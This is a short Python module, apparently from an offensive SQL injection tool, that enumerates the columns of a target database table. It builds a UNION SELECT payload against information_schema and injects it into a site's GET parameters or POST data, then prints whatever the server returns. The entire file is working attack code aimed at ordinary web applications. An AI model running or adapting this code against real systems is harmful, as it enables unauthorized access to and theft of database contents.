# modules/columns.py
def enumerate(injector, db_name, table_name):
    print(f"[+] Listing columns in {db_name}.{table_name}")
    payload = f"' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='{table_name}' AND table_schema='{db_name}'-- -"
    response = inject(injector, payload)
    print(response)

def inject(injector, payload):
    if "?" in injector.url:
        url = injector.url.replace("=", "=" + payload)
        r = injector.session.get(url, headers=injector.headers)
        return r.text
    elif injector.args.method.upper() == "POST":
        post_data = injector.args.data.replace("=", "=" + payload)
        r = injector.session.post(injector.url, data=post_data, headers=injector.headers)
        return r.text
    return "Injection failed"
